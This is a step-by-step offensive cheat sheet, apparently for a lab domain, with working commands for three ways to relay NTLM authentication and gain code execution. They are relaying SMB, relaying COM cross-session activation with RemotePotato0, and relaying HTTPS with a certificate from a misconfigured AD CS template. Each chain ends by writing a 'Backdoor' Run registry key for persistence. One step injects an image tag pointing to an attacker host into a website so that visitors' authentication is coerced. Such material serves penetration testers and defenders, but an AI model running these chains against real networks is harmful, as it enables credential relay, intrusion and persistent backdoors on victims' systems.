# Relaying Unprivileged Users to RCE

## Relaying from SMB to Remote Registry

Start SMB relay server.

~~~ bash
impacket-ntlmrelayx --no-raw-server --no-wcf-server --no-rpc-server --no-http-server -smb2support -t smb://srv01.contoso.local -socks --keep-relaying
~~~

Get user to authenticate to the relay server.

Set up persistence in *HKCU*.

~~~ bash
proxychains impacket-reg -no-pass CONTOSO/USER1@srv01.contoso.local query -keyName HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -s
proxychains impacket-reg -no-pass CONTOSO/USER1@srv01.contoso.local add -keyName HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -vt REG_SZ -vd 'cmd.exe /c calc'
~~~

## Relaying from COM Cross-session Activation to Remote Registry

Start OXID resolver.

~~~ bash
git clone --depth 1 --branch rpc-relay-server https://github.com/mrale98/impacket ./impacket-mrale98
cd ./impacket-mrale98
python3 -m venv .venv
source .venv/bin/activate
python ./examples/rpcoxidresolver.py -oip 172.30.253.1 -rip 172.30.253.1 -rport 9997
~~~

Start RPC relay server.

~~~ bash
impacket-ntlmrelayx -smb2support --no-smb-server --no-wcf-server --no-raw-server --no-http-server --rpc-port 9997 -t smb://srv02.contoso.local -socks --keep-relaying
~~~

Coerce authentication from another logon session with [RemotePotato0](https://github.com/antonioCoco/RemotePotato0).
Last three arguments don't matter because OXID resolver in RemotePotato0 is not used.

~~~ powershell
query.exe session
.\remotepotato0.exe -m 2 -s 3 -c '{354ff91b-5e49-4bdc-a8e6-1cb6c6877182}' -x 172.30.253.1 -r 1.3.3.7 -l 1338 -p 1339
~~~

Set up persistence in *HKCU*.

~~~ bash
proxychains impacket-reg -no-pass CONTOSO/USER2@srv02.contoso.local query -keyName HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -s
proxychains impacket-reg -no-pass CONTOSO/USER2@srv02.contoso.local add -keyName HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -vt REG_SZ -vd 'cmd.exe /c calc'
~~~

## Relaying from HTTPS to Remote Registry

Obtain TGT.

~~~ bash
impacket-gettgt 'contoso.local/attacker:Password1234'
krbconf set ./attacker.ccache -K dc01.contoso.local
~~~

Create DNS record.

~~~ bash
git clone --depth 1 https://github.com/ccob/gssapi-abuse
cd ./gssapi-abuse
python3 -m venv .venv
source .venv/bin/activate
python3 ./gssapi-abuse.py --domain contoso.local dns --action add --target attacker --type A --data 172.30.253.1
~~~

Discover misconfigured certificate templates.

~~~ bash
certipy find -k -no-pass -target dc01.contoso.local -dc-only -stdout > ./certipy.txt
grep -A 23 BadWebServer ./certipy.txt
~~~

Request certificate.

~~~ bash
certipy req -k -no-pass -ca contoso-SRV01-CA -target srv01.contoso.local -template BadWebServer -dns attacker
certipy cert -pfx ./attacker.pfx -out ./attacker.key -nocert
certipy cert -pfx ./attacker.pfx -out ./attacker.pem -nokey
openssl x509 -in ./attacker.pem -text -noout | grep -A 1 'X509v3 Subject Alternative Name:'
~~~

Start HTTPS relay server.

~~~ bash
git clone --depth 1 https://github.com/coontzy1/impacket ./impacket-coontzy1
cd ./impacket-coontzy1
python3 -m venv .venv
source .venv/bin/activate
python3 ./examples/ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server --no-rpc-server -smb2support --https --certfile ./attacker.pem --keyfile ./attacker.key --http-port 443 -t smb://srv01.contoso.local -socks --keep-relaying
~~~

Insert `<img src=https://attacker>` into target website, then wait for user to visit the site.

Set up persistence in *HKCU*.

~~~ bash
proxychains impacket-reg -no-pass CONTOSO/USER1@srv01.contoso.local query -keyName HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -s
proxychains impacket-reg -no-pass CONTOSO/USER1@srv01.contoso.local add -keyName HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -vt REG_SZ -vd 'cmd.exe /c calc'
~~~
